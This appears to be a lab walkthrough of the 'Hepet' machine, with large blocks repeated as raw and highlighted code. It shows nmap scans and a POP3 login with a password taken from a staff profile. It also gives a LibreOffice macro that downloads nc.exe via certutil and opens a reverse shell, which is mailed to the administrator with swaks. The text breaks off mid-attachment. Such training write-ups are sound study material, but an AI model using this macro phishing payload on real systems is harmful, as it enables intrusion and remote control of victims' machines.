+OS:(R=Y%DF=Y%T=80%W=4000%O=M578NW0NNS%CC=N%Q=)T1(R=Y%DF=Y%T=80%S=O%A=S+%F=A
+OS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T5(R
+OS:=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=80%W=0%S=A%A=O%F
+OS:=R%O=%RD=0%Q=)T7(R=N)U1(R=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%
+OS:RUCK=G%RUD=G)IE(R=N)
+
+Network Distance: 4 hops
+Service Info: Host: localhost; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| smb2-security-mode: 
+|   3.1.1: 
+|_    Message signing enabled but not required
+| smb2-time: 
+|   date: 2026-01-28T20:30:38
+|_  start_date: N/A
+
+TRACEROUTE (using port 995/tcp)
+HOP RTT     ADDRESS
+1   5.58 ms 192.168.45.1
+2   5.95 ms 192.168.45.254
+3   6.69 ms 192.168.251.1
+4   7.37 ms 192.168.145.140
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 201.82 seconds</pre><pre class="hljs"><code>&boxdr;&boxh;&boxh;(kali㉿kali)-[~/Desktop/Labs/Hepet]
+&boxur;&boxh;$ sudo nmap -sS -sV -A 192.168.145.140 -p- -Pn
+[sudo] password for kali: 
+Starting Nmap 7.98 ( https://nmap.org ) at 2026-01-28 15:27 -0500
+Nmap scan report for 192.168.145.140
+Host is up (0.0063s latency).
+Not shown: 65512 closed tcp ports (reset)
+PORT      STATE SERVICE        VERSION
+25/tcp    open  smtp           Mercury/32 smtpd (Mail server account Maiser)
+| smtp-commands: localhost Hello nmap.scanme.org; ESMTPs are:, TIME, SIZE 0, HELP
+|_ Recognized SMTP commands are: HELO EHLO MAIL RCPT DATA RSET AUTH NOOP QUIT HELP VRFY SOML Mail server account is &apos;Maiser&apos;.
+79/tcp    open  finger         Mercury/32 fingerd
+| finger: Login: Admin         Name: Mail System Administrator\x0D
+| \x0D
+|_[No profile information]\x0D
+105/tcp   open  ph-addressbook Mercury/32 PH addressbook server
+106/tcp   open  pop3pw         Mercury/32 poppass service
+110/tcp   open  pop3           Mercury/32 pop3d
+|_pop3-capabilities: APOP TOP USER EXPIRE(NEVER) UIDL
+135/tcp   open  msrpc          Microsoft Windows RPC
+139/tcp   open  netbios-ssn    Microsoft Windows netbios-ssn
+143/tcp   open  imap           Mercury/32 imapd 4.62
+|_imap-capabilities: IMAP4rev1 X-MERCURY-1A0001 complete OK CAPABILITY AUTH=PLAIN
+443/tcp   open  ssl/http       Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1g PHP/7.3.23)
+| tls-alpn: 
+|_  http/1.1
+| http-methods: 
+|_  Potentially risky methods: TRACE
+|_ssl-date: TLS randomness does not represent time
+| ssl-cert: Subject: commonName=localhost
+| Not valid before: 2009-11-10T23:48:47
+|_Not valid after:  2019-11-08T23:48:47
+|_http-title: Time Travel Company Page
+|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1g PHP/7.3.23
+445/tcp   open  microsoft-ds?
+2224/tcp  open  http           Mercury/32 httpd
+|_http-title: Mercury HTTP Services
+5040/tcp  open  unknown
+7680/tcp  open  pando-pub?
+8000/tcp  open  http           Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1g PHP/7.3.23)
+|_http-title: Time Travel Company Page
+|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1g PHP/7.3.23
+|_http-open-proxy: Proxy might be redirecting requests
+| http-methods: 
+|_  Potentially risky methods: TRACE
+11100/tcp open  vnc            VNC (protocol 3.8)
+| vnc-info: 
+|   Protocol version: 3.8
+|   Security types: 
+|_    Unknown security type (40)
+20001/tcp open  ftp            FileZilla ftpd 0.9.41 beta
+|_ftp-bounce: bounce working!
+| ftp-syst: 
+|_  SYST: UNIX emulated by FileZilla
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+| -r--r--r-- 1 ftp ftp            312 Oct 20  2020 .babelrc
+| -r--r--r-- 1 ftp ftp            147 Oct 20  2020 .editorconfig
+| -r--r--r-- 1 ftp ftp             23 Oct 20  2020 .eslintignore
+| -r--r--r-- 1 ftp ftp            779 Oct 20  2020 .eslintrc.js
+| -r--r--r-- 1 ftp ftp            167 Oct 20  2020 .gitignore
+| -r--r--r-- 1 ftp ftp            228 Oct 20  2020 .postcssrc.js
+| -r--r--r-- 1 ftp ftp            346 Oct 20  2020 .tern-project
+| drwxr-xr-x 1 ftp ftp              0 Oct 20  2020 build
+| drwxr-xr-x 1 ftp ftp              0 Oct 20  2020 config
+| -r--r--r-- 1 ftp ftp           1376 Oct 20  2020 index.html
+| -r--r--r-- 1 ftp ftp         425010 Oct 20  2020 package-lock.json
+| -r--r--r-- 1 ftp ftp           2454 Oct 20  2020 package.json
+| -r--r--r-- 1 ftp ftp           1100 Oct 20  2020 README.md
+| drwxr-xr-x 1 ftp ftp              0 Oct 20  2020 src
+| drwxr-xr-x 1 ftp ftp              0 Oct 20  2020 static
+|_-r--r--r-- 1 ftp ftp            127 Oct 20  2020 _redirects
+33006/tcp open  mysql          MariaDB 10.3.24 or later (unauthorized)
+49664/tcp open  msrpc          Microsoft Windows RPC
+49665/tcp open  msrpc          Microsoft Windows RPC
+49666/tcp open  msrpc          Microsoft Windows RPC
+49667/tcp open  msrpc          Microsoft Windows RPC
+49668/tcp open  msrpc          Microsoft Windows RPC
+49669/tcp open  msrpc          Microsoft Windows RPC
+No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
+TCP/IP fingerprint:
+OS:SCAN(V=7.98%E=4%D=1/28%OT=25%CT=1%CU=38377%PV=Y%DS=4%DC=T%G=Y%TM=697A71F
+OS:C%P=x86_64-pc-linux-gnu)SEQ(SP=104%GCD=1%ISR=10A%TI=I%CI=I%TS=U)SEQ(SP=1
+OS:05%GCD=1%ISR=106%TI=I%CI=I%TS=U)SEQ(SP=105%GCD=1%ISR=10A%TI=I%CI=I%TS=U)
+OS:SEQ(SP=105%GCD=1%ISR=10B%TI=I%CI=I%TS=U)SEQ(SP=FE%GCD=1%ISR=103%TI=I%CI=
+OS:I%TS=U)OPS(O1=M578NW0NNS%O2=M578NW0NNS%O3=M578NW0%O4=M578NW0NNS%O5=M578N
+OS:W0NNS%O6=M578NNS)WIN(W1=4000%W2=4000%W3=4000%W4=4000%W5=4000%W6=4000)ECN
+OS:(R=Y%DF=Y%T=80%W=4000%O=M578NW0NNS%CC=N%Q=)T1(R=Y%DF=Y%T=80%S=O%A=S+%F=A
+OS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T5(R
+OS:=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=80%W=0%S=A%A=O%F
+OS:=R%O=%RD=0%Q=)T7(R=N)U1(R=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%
+OS:RUCK=G%RUD=G)IE(R=N)
+
+Network Distance: 4 hops
+Service Info: Host: localhost; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| smb2-security-mode: 
+|   3.1.1: 
+|_    Message signing enabled but not required
+| smb2-time: 
+|   date: 2026-01-28T20:30:38
+|_  start_date: N/A
+
+TRACEROUTE (using port 995/tcp)
+HOP RTT     ADDRESS
+1   5.58 ms 192.168.45.1
+2   5.95 ms 192.168.45.254
+3   6.69 ms 192.168.251.1
+4   7.37 ms 192.168.145.140
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 201.82 seconds</code></pre></div>
+<p>Browse over to the web application to identify the possible employees. One that stands out immediately is <code class="inline-code">Jonas K.</code>, as their description contains the text <code class="inline-code">SicMundusCreatusEst</code>.</p>
+<p>Since mail ports are open, connecting to the POP3 port works successfully using the credentials <code class="inline-code">jonas:SicMundusCreatusEst</code>:</p>
+<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```
+" data-joplin-source-close="
+```">&boxdr;&boxh;&boxh;(kali㉿kali)-[~/Desktop/Labs/Hepet]
+&boxur;&boxh;$ telnet 192.168.145.140 110
+Trying 192.168.145.140...
+Connected to 192.168.145.140.
+Escape character is &apos;^]&apos;.
++OK &lt;653218.29431@localhost&gt;, POP3 server ready.
+HELP
++OK
+Mercury/32 MTS Post Office Protocol v3 server v4.62,
+Copyright (c) 1993-2008 David Harris.
+This server recognizes the following commands:
+  USER - login as a user
+  PASS - specify a password
+  APOP - perform secure login
+  CAPA - RFC2449 capability discovery
+  STLS - Start TLS negotiation, if enabled
+  STAT - show mailbox statistics
+  RETR - send a message
+  LIST - show message numbers and sizes
+  DELE - delete a message
+  RSET - &apos;undo&apos; all mailbox changes
+  TOP  - show lines from a message
+  QUIT - close the connection
+  NOOP, RPOP, LAST are also supported.
+
+Extended commands:
+  XTND XMIT  - Send a message via POP3
+  XTND XLST  - Eudora extended list command
+  UIDL - return unique identifier (RFC1725).
+.
+USER jonas
++OK jonas is known here.
+PASS SicMundusCreatusEst
++OK Welcome! 4 messages (4744 bytes)
+
+</pre><pre class="hljs"><code>&boxdr;&boxh;&boxh;(kali㉿kali)-[~/Desktop/Labs/Hepet]
+&boxur;&boxh;$ telnet 192.168.145.140 110
+Trying 192.168.145.140...
+Connected to 192.168.145.140.
+Escape character is &apos;^]&apos;.
++OK &lt;653218.29431@localhost&gt;, POP3 server ready.
+HELP
++OK
+Mercury/32 MTS Post Office Protocol v3 server v4.62,
+Copyright (c) 1993-2008 David Harris.
+This server recognizes the following commands:
+  USER - login as a user
+  PASS - specify a password
+  APOP - perform secure login
+  CAPA - RFC2449 capability discovery
+  STLS - Start TLS negotiation, if enabled
+  STAT - show mailbox statistics
+  RETR - send a message
+  LIST - show message numbers and sizes
+  DELE - delete a message
+  RSET - &apos;undo&apos; all mailbox changes
+  TOP  - show lines from a message
+  QUIT - close the connection
+  NOOP, RPOP, LAST are also supported.
+
+Extended commands:
+  XTND XMIT  - Send a message via POP3
+  XTND XLST  - Eudora extended list command
+  UIDL - return unique identifier (RFC1725).
+.
+USER jonas
++OK jonas is known here.
+PASS SicMundusCreatusEst
++OK Welcome! 4 messages (4744 bytes)
+
+</code></pre></div>
+<p>As shown by the output above, there are four new messages.</p>
+<p>The four emails are the following:</p>
+<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```
+" data-joplin-source-close="
+```">RETR 1
++OK Here it comes...
+Received: from spooler by localhost (Mercury/32 v4.62); 19 Oct 2020 12:29:03 -0700
+X-Envelope-To: &lt;jonas@localhost&gt;
+Return-path: &lt;agnes@localhost&gt;
+Received: from kali (192.168.118.8) by localhost (Mercury/32 v4.62) with ESMTP ID MG00000A;
+   19 Oct 2020 12:28:54 -0700
+Message-ID: &lt;135985.54474035-sendEmail@kali&gt;
+From: &quot;agnes@localhost&quot; &lt;agnes@localhost&gt;
+To: &quot;mailadmin@localhost&quot; &lt;mailadmin@localhost&gt;
+Cc: &quot;jonas@localhost&quot; &lt;jonas@localhost&gt;,
+ &quot;magnus@localhost&quot; &lt;magnus@localhost&gt;
+Subject: Contacts Information
+Date: Mon, 19 Oct 2020 19:28:53 +0000
+X-Mailer: sendEmail-1.56
+MIME-Version: 1.0
+Content-Type: multipart/related; boundary=&quot;----MIME delimiter for sendEmail-678721.390272589&quot;
+
+This is a multi-part message in MIME format. To properly display this message you need a MIME-Version 1.0 compliant Email program.
+
+------MIME delimiter for sendEmail-678721.390272589
+Content-Type: text/plain;
+        charset=&quot;iso-8859-1&quot;
+Content-Transfer-Encoding: 7bit
+
+Hi team!
+
+I&apos;m new here, will be doing PR for the company. 
+Its a pleasure to work with all of you!
+
+If you can please send to mailadmin the spreadsheet for printing with all the company contacts will be really apreciated .
+
+Ela, can you install the office suite on my machine?
+
+Cheers!
+
+
+------MIME delimiter for sendEmail-678721.390272589--
+
+.
+RETR 2
++OK Here it comes...
+Received: from spooler by localhost (Mercury/32 v4.62); 19 Oct 2020 12:28:52 -0700
+X-Envelope-To: &lt;jonas@localhost&gt;
+Return-path: &lt;martha@localhost&gt;
+Received: from kali (192.168.118.8) by localhost (Mercury/32 v4.62) with ESMTP ID MG000006;
+   19 Oct 2020 12:28:48 -0700
+Message-ID: &lt;898523.650921078-sendEmail@kali&gt;
+From: &quot;martha@localhost&quot; &lt;martha@localhost&gt;
+To: &quot;jonas@localhost&quot; &lt;jonas@localhost&gt;
+Subject: Love
+Date: Mon, 19 Oct 2020 19:28:47 +0000
+X-Mailer: sendEmail-1.56
+MIME-Version: 1.0
+Content-Type: multipart/related; boundary=&quot;----MIME delimiter for sendEmail-159605.589303286&quot;
+
+This is a multi-part message in MIME format. To properly display this message you need a MIME-Version 1.0 compliant Email program.
+
+------MIME delimiter for sendEmail-159605.589303286
+Content-Type: text/plain;
+        charset=&quot;iso-8859-1&quot;
+Content-Transfer-Encoding: 7bit
+
+Forever and ever?
+
+
+------MIME delimiter for sendEmail-159605.589303286--
+
+.
+RETR 3
++OK Here it comes...
+Received: from spooler by localhost (Mercury/32 v4.62); 19 Oct 2020 12:28:41 -0700
+X-Envelope-To: &lt;jonas@localhost&gt;
+Return-path: &lt;mailadmin@localhost&gt;
+Received: from kali (192.168.118.8) by localhost (Mercury/32 v4.62) with ESMTP ID MG000001;
+   19 Oct 2020 12:28:40 -0700
+Message-ID: &lt;359094.447081105-sendEmail@kali&gt;
+From: &quot;mailadmin@localhost&quot; &lt;mailadmin@localhost&gt;
+To: &quot;agnes@localhost&quot; &lt;agnes@localhost&gt;
+Cc: &quot;jonas@localhost&quot; &lt;jonas@localhost&gt;,
+ &quot;magnus@localhost&quot; &lt;magnus@localhost&gt;
+Subject: Important
+Date: Mon, 19 Oct 2020 19:28:39 +0000
+X-Mailer: sendEmail-1.56
+MIME-Version: 1.0
+Content-Type: multipart/related; boundary=&quot;----MIME delimiter for sendEmail-808784.915440814&quot;
+
+This is a multi-part message in MIME format. To properly display this message you need a MIME-Version 1.0 compliant Email program.
+
+------MIME delimiter for sendEmail-808784.915440814
+Content-Type: text/plain;
+        charset=&quot;iso-8859-1&quot;
+Content-Transfer-Encoding: 7bit
+
+Team,
+
+We will be changing our office suite to LibreOffice. For the moment, all the spreadsheets and documents will be first procesed in the mail server directly to check the compatibility. 
+
+I will forward all the documents after checking everything is working okay. 
+
+Sorry for the inconveniences.
+
+
+------MIME delimiter for sendEmail-808784.915440814--
+
+.
+RETR 4
++OK Here it comes...
+Received: from spooler by localhost (Mercury/32 v4.62); 19 Oct 2020 12:28:52 -0700
+X-Envelope-To: &lt;jonas@localhost&gt;
+Return-path: &lt;mailadmin@localhost&gt;
+Received: from kali (192.168.118.8) by localhost (Mercury/32 v4.62) with ESMTP ID MG000008;
+   19 Oct 2020 12:28:51 -0700
+Message-ID: &lt;841577.174232469-sendEmail@kali&gt;
+From: &quot;mailadmin@localhost&quot; &lt;mailadmin@localhost&gt;
+To: &quot;jonas@localhost&quot; &lt;jonas@localhost&gt;
+Subject: Weak Password
+Date: Mon, 19 Oct 2020 19:28:50 +0000
+X-Mailer: sendEmail-1.56
+MIME-Version: 1.0
+Content-Type: multipart/related; boundary=&quot;----MIME delimiter for sendEmail-502425.856729136&quot;
+
+This is a multi-part message in MIME format. To properly display this message you need a MIME-Version 1.0 compliant Email program.
+
+------MIME delimiter for sendEmail-502425.856729136
+Content-Type: text/plain;
+        charset=&quot;iso-8859-1&quot;
+Content-Transfer-Encoding: 7bit
+
+Hey Jonas,
+
+Please change your password, you cannot use the same password as your one liner description, just dont.
+
+Thanks!
+
+
+------MIME delimiter for sendEmail-502425.856729136--
+
+.</pre><pre class="hljs"><code>RETR 1
++OK Here it comes...
+Received: from spooler by localhost (Mercury/32 v4.62); 19 Oct 2020 12:29:03 -0700
+X-Envelope-To: &lt;jonas@localhost&gt;
+Return-path: &lt;agnes@localhost&gt;
+Received: from kali (192.168.118.8) by localhost (Mercury/32 v4.62) with ESMTP ID MG00000A;
+   19 Oct 2020 12:28:54 -0700
+Message-ID: &lt;135985.54474035-sendEmail@kali&gt;
+From: &quot;agnes@localhost&quot; &lt;agnes@localhost&gt;
+To: &quot;mailadmin@localhost&quot; &lt;mailadmin@localhost&gt;
+Cc: &quot;jonas@localhost&quot; &lt;jonas@localhost&gt;,
+ &quot;magnus@localhost&quot; &lt;magnus@localhost&gt;
+Subject: Contacts Information
+Date: Mon, 19 Oct 2020 19:28:53 +0000
+X-Mailer: sendEmail-1.56
+MIME-Version: 1.0
+Content-Type: multipart/related; boundary=&quot;----MIME delimiter for sendEmail-678721.390272589&quot;
+
+This is a multi-part message in MIME format. To properly display this message you need a MIME-Version 1.0 compliant Email program.
+
+------MIME delimiter for sendEmail-678721.390272589
+Content-Type: text/plain;
+        charset=&quot;iso-8859-1&quot;
+Content-Transfer-Encoding: 7bit
+
+Hi team!
+
+I&apos;m new here, will be doing PR for the company. 
+Its a pleasure to work with all of you!
+
+If you can please send to mailadmin the spreadsheet for printing with all the company contacts will be really apreciated .
+
+Ela, can you install the office suite on my machine?
+
+Cheers!
+
+
+------MIME delimiter for sendEmail-678721.390272589--
+
+.
+RETR 2
++OK Here it comes...
+Received: from spooler by localhost (Mercury/32 v4.62); 19 Oct 2020 12:28:52 -0700
+X-Envelope-To: &lt;jonas@localhost&gt;
+Return-path: &lt;martha@localhost&gt;
+Received: from kali (192.168.118.8) by localhost (Mercury/32 v4.62) with ESMTP ID MG000006;
+   19 Oct 2020 12:28:48 -0700
+Message-ID: &lt;898523.650921078-sendEmail@kali&gt;
+From: &quot;martha@localhost&quot; &lt;martha@localhost&gt;
+To: &quot;jonas@localhost&quot; &lt;jonas@localhost&gt;
+Subject: Love
+Date: Mon, 19 Oct 2020 19:28:47 +0000
+X-Mailer: sendEmail-1.56
+MIME-Version: 1.0
+Content-Type: multipart/related; boundary=&quot;----MIME delimiter for sendEmail-159605.589303286&quot;
+
+This is a multi-part message in MIME format. To properly display this message you need a MIME-Version 1.0 compliant Email program.
+
+------MIME delimiter for sendEmail-159605.589303286
+Content-Type: text/plain;
+        charset=&quot;iso-8859-1&quot;
+Content-Transfer-Encoding: 7bit
+
+Forever and ever?
+
+
+------MIME delimiter for sendEmail-159605.589303286--
+
+.
+RETR 3
++OK Here it comes...
+Received: from spooler by localhost (Mercury/32 v4.62); 19 Oct 2020 12:28:41 -0700
+X-Envelope-To: &lt;jonas@localhost&gt;
+Return-path: &lt;mailadmin@localhost&gt;
+Received: from kali (192.168.118.8) by localhost (Mercury/32 v4.62) with ESMTP ID MG000001;
+   19 Oct 2020 12:28:40 -0700
+Message-ID: &lt;359094.447081105-sendEmail@kali&gt;
+From: &quot;mailadmin@localhost&quot; &lt;mailadmin@localhost&gt;
+To: &quot;agnes@localhost&quot; &lt;agnes@localhost&gt;
+Cc: &quot;jonas@localhost&quot; &lt;jonas@localhost&gt;,
+ &quot;magnus@localhost&quot; &lt;magnus@localhost&gt;
+Subject: Important
+Date: Mon, 19 Oct 2020 19:28:39 +0000
+X-Mailer: sendEmail-1.56
+MIME-Version: 1.0
+Content-Type: multipart/related; boundary=&quot;----MIME delimiter for sendEmail-808784.915440814&quot;
+
+This is a multi-part message in MIME format. To properly display this message you need a MIME-Version 1.0 compliant Email program.
+
+------MIME delimiter for sendEmail-808784.915440814
+Content-Type: text/plain;
+        charset=&quot;iso-8859-1&quot;
+Content-Transfer-Encoding: 7bit
+
+Team,
+
+We will be changing our office suite to LibreOffice. For the moment, all the spreadsheets and documents will be first procesed in the mail server directly to check the compatibility. 
+
+I will forward all the documents after checking everything is working okay. 
+
+Sorry for the inconveniences.
+
+
+------MIME delimiter for sendEmail-808784.915440814--
+
+.
+RETR 4
++OK Here it comes...
+Received: from spooler by localhost (Mercury/32 v4.62); 19 Oct 2020 12:28:52 -0700
+X-Envelope-To: &lt;jonas@localhost&gt;
+Return-path: &lt;mailadmin@localhost&gt;
+Received: from kali (192.168.118.8) by localhost (Mercury/32 v4.62) with ESMTP ID MG000008;
+   19 Oct 2020 12:28:51 -0700
+Message-ID: &lt;841577.174232469-sendEmail@kali&gt;
+From: &quot;mailadmin@localhost&quot; &lt;mailadmin@localhost&gt;
+To: &quot;jonas@localhost&quot; &lt;jonas@localhost&gt;
+Subject: Weak Password
+Date: Mon, 19 Oct 2020 19:28:50 +0000
+X-Mailer: sendEmail-1.56
+MIME-Version: 1.0
+Content-Type: multipart/related; boundary=&quot;----MIME delimiter for sendEmail-502425.856729136&quot;
+
+This is a multi-part message in MIME format. To properly display this message you need a MIME-Version 1.0 compliant Email program.
+
+------MIME delimiter for sendEmail-502425.856729136
+Content-Type: text/plain;
+        charset=&quot;iso-8859-1&quot;
+Content-Transfer-Encoding: 7bit
+
+Hey Jonas,
+
+Please change your password, you cannot use the same password as your one liner description, just dont.
+
+Thanks!
+
+
+------MIME delimiter for sendEmail-502425.856729136--
+
+.</code></pre></div>
+<p>One email that stands out is the following:</p>
+<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```
+" data-joplin-source-close="
+```">From: &quot;agnes@localhost&quot; &lt;agnes@localhost&gt;
+To: &quot;mailadmin@localhost&quot; &lt;mailadmin@localhost&gt;
+Cc: &quot;jonas@localhost&quot; &lt;jonas@localhost&gt;,
+ &quot;magnus@localhost&quot; &lt;magnus@localhost&gt;
+Subject: Contacts Information
+Date: Mon, 19 Oct 2020 19:28:53 +0000
+X-Mailer: sendEmail-1.56
+MIME-Version: 1.0
+Content-Type: multipart/related; boundary=&quot;----MIME delimiter for sendEmail-678721.390272589&quot;
+
+This is a multi-part message in MIME format. To properly display this message you need a MIME-Version 1.0 compliant Email program.
+
+------MIME delimiter for sendEmail-678721.390272589
+Content-Type: text/plain;
+        charset=&quot;iso-8859-1&quot;
+Content-Transfer-Encoding: 7bit
+
+Hi team!
+
+I&apos;m new here, will be doing PR for the company. 
+Its a pleasure to work with all of you!
+
+If you can please send to mailadmin the spreadsheet for printing with all the company contacts will be really apreciated .
+
+Ela, can you install the office suite on my machine?
+
+Cheers!
+
+
+------MIME delimiter for sendEmail-678721.390272589--
+</pre><pre class="hljs"><code>From: <span class="hljs-string">&quot;agnes@localhost&quot;</span> &lt;agnes@localhost&gt;
+<span class="hljs-keyword">To</span>: <span class="hljs-string">&quot;mailadmin@localhost&quot;</span> &lt;mailadmin@localhost&gt;
+Cc: <span class="hljs-string">&quot;jonas@localhost&quot;</span> &lt;jonas@localhost&gt;,
+ <span class="hljs-string">&quot;magnus@localhost&quot;</span> &lt;magnus@localhost&gt;
+Subject: Contacts Information
+Date: Mon, <span class="hljs-number">19</span> Oct <span class="hljs-number">2020</span> <span class="hljs-number">19</span>:<span class="hljs-number">28</span>:<span class="hljs-number">53</span> +<span class="hljs-number">0000</span>
+X-Mailer: sendEmail-<span class="hljs-number">1.56</span>
+MIME-Version: <span class="hljs-number">1.0</span>
+Content-<span class="hljs-keyword">Type</span>: multipart/related; boundary=<span class="hljs-string">&quot;----MIME delimiter for sendEmail-678721.390272589&quot;</span>
+
+This <span class="hljs-keyword">is</span> a multi-part message <span class="hljs-keyword">in</span> MIME format. <span class="hljs-keyword">To</span> properly display this message you need a MIME-Version <span class="hljs-number">1.0</span> compliant Email program.
+
+<span class="hljs-comment">------MIME delimiter for sendEmail-678721.390272589</span>
+Content-<span class="hljs-keyword">Type</span>: <span class="hljs-literal">text</span>/plain;
+        charset=<span class="hljs-string">&quot;iso-8859-1&quot;</span>
+Content-Transfer-Encoding: <span class="hljs-number">7</span><span class="hljs-built_in">bit</span>
+
+Hi team!
+
+I<span class="hljs-symbol">&apos;m</span> <span class="hljs-keyword">new</span> here, will be doing PR <span class="hljs-keyword">for</span> the company. 
+Its a pleasure <span class="hljs-keyword">to</span> work <span class="hljs-keyword">with</span> <span class="hljs-keyword">all</span> <span class="hljs-keyword">of</span> you!
+
+<span class="hljs-keyword">If</span> you can please send <span class="hljs-keyword">to</span> mailadmin the spreadsheet <span class="hljs-keyword">for</span> printing <span class="hljs-keyword">with</span> <span class="hljs-keyword">all</span> the company contacts will be really apreciated .
+
+Ela, can you install the office suite <span class="hljs-keyword">on</span> my machine?
+
+Cheers!
+
+
+<span class="hljs-comment">------MIME delimiter for sendEmail-678721.390272589--</span>
+</code></pre></div>
+<p>From the output above, it looks like we can send a spreadsheet to the <code class="inline-code">mailadmin@localhost</code>. The third email also mentions they have changed their office suite to <code class="inline-code">LibreOffice</code>, and all documents will be checked. Can I perform macro execution?</p>
+<p>Using <code class="inline-code">LibreOffice</code>, create a new Macro that contains the following code:</p>
+<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```
+" data-joplin-source-close="
+```">Sub Main
+    Shell(&quot;certutil.exe -urlcache -split -f &apos;http://192.168.45.197/nc.exe&apos; &apos;C:\Windows\Temp\nc.exe&apos;&quot;)
+    Shell(&quot;C:\Windows\Temp\nc.exe 192.168.45.197 443 -e cmd.exe&quot;)
+End Sub</pre><pre class="hljs"><code>Sub Main
+    Shell(<span class="hljs-string">&quot;certutil.exe -urlcache -split -f &apos;http://192.168.45.197/nc.exe&apos; &apos;C:<span class="hljs-char escape_">\W</span>indows<span class="hljs-char escape_">\T</span>emp<span class="hljs-char escape_">\n</span>c.exe&apos;&quot;</span>)
+    Shell(<span class="hljs-string">&quot;C:<span class="hljs-char escape_">\W</span>indows<span class="hljs-char escape_">\T</span>emp<span class="hljs-char escape_">\n</span>c.exe 192.168.45.197 443 -e cmd.exe&quot;</span>)
+End Sub</code></pre></div>
+<p>Remember to set the Macro to run when the document is open: <a data-from-md="" title="https://dominicbreuker.com/post/htb_re/" href="https://dominicbreuker.com/post/htb_re/">HTB Writeup</a>.</p>
+<p>Send the email:</p>
+<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```
+" data-joplin-source-close="
+```">&boxdr;&boxh;&boxh;(kali㉿kali)-[~/Desktop/Labs/Hepet]
+&boxur;&boxh;$ sudo swaks --to mailadmin@localhost --from jonas@localhost --body &quot;Spreadsheet Data&quot; --attach @data.ods --header &quot;Subject: Spreadshet Data For Year 2025&quot; --server 192.168.145.140                               
+=== Trying 192.168.145.140:25...
+=== Connected to 192.168.145.140.
+&lt;-  220 localhost ESMTP server ready.
+ -&gt; EHLO kali
+&lt;-  250-localhost Hello kali; ESMTPs are:
+&lt;-  250-TIME
+&lt;-  250-SIZE 0
+&lt;-  250 HELP
+ -&gt; MAIL FROM:&lt;jonas@localhost&gt;
+&lt;-  250 Sender OK - send RCPTs.
+ -&gt; RCPT TO:&lt;mailadmin@localhost&gt;
+&lt;-  250 Recipient OK - send RCPT or DATA.
+ -&gt; DATA
+&lt;-  354 OK, send data, end with CRLF.CRLF
+ -&gt; Date: Wed, 28 Jan 2026 17:15:12 -0500
+ -&gt; To: mailadmin@localhost
+ -&gt; From: jonas@localhost
+ -&gt; Subject: Spreadshet Data For Year 2025
+ -&gt; Message-Id: &lt;20260128171512.204001@kali&gt;
+ -&gt; X-Mailer: swaks v20240103.0 jetmore.org/john/code/swaks/
+ -&gt; MIME-Version: 1.0
+ -&gt; Content-Type: multipart/mixed; boundary=&quot;----=_MIME_BOUNDARY_000_204001&quot;
+ -&gt; 
+ -&gt; ------=_MIME_BOUNDARY_000_204001
+ -&gt; Content-Type: text/plain
+ -&gt; 
+ -&gt; Spreadsheet Data
+ -&gt; ------=_MIME_BOUNDARY_000_204001
+ -&gt; Content-Type: application/octet-stream; name=&quot;data.ods&quot;
+ -&gt; Content-Description: data.ods
+ -&gt; Content-Disposition: attachment; filename=&quot;data.ods&quot;
+ -&gt; Content-Transfer-Encoding: BASE64
+ -&gt; 
+ -&gt; UEsDBBQAAAgAAJuuPFyFbDmKLgAAAC4AAAAIAAAAbWltZXR5cGVhcHBsaWNhdGlvbi92bmQub2Fz
+ -&gt; aXMub3BlbmRvY3VtZW50LnNwcmVhZHNoZWV0UEsDBBQACAgIAJuuPFwAAAAAAAAAAAAAAAAMAAAA
+ -&gt; c2V0dGluZ3MueG1s7VrdU+I6FH+/f4XTd0Tw466MsoO4XrmrK0PR3btvoT1AxjSnk6QW9q+/Jy04
+ -&gt; iq0XC3Fm7/gETZPf+cjJ+WpOPs8isfMASnOUp15jd8/bARlgyOXk1LsdXtQ+eZ/bf5zgeMwDaIUY
+ -&gt; JBFIU9NgDE3RO7Rc6laAcsxpQaJkC5nmuiVZBLplghbGIJfLWk9ntzJi+chMcHl/6k2NiVv1epqm
+ -&gt; u+n+LqpJvXF8fFzP3i6nIuLjRIudc5ZNbu7tHdTz58fZ2dO6jC2kzBhb/H+imgOvvdTDUvz2yUKW
+ -&gt; /KfGDURWNzuLYUvs1COWWw8c0keteUXrnq+545qPBHQUsCHG3vKlmcf0kkvjtfdO6i9B3gR8BWPj
+ -&gt; Bvk7D820CLrZPPy0Mfol8Mm0kPODw+a66LWIxTUuQ5hBuEoJ0uItytaQuaj5OvxC2gtXmNRG0f57
+ -&gt; bWsNjTdxakFX+Bwy0sd/Mfp8iT8FMI01zK+bKI2qj5obsv4fRbo+qraPz5H/KTSSigbYCQx/AD8W
+ -&gt; 3AyYnMCq8qeoLHo18CXHWz40S9hBmUlviLtd57FEPUNjMNoi8E/EaEgoxVu2AegdE8kqasZoY6+q
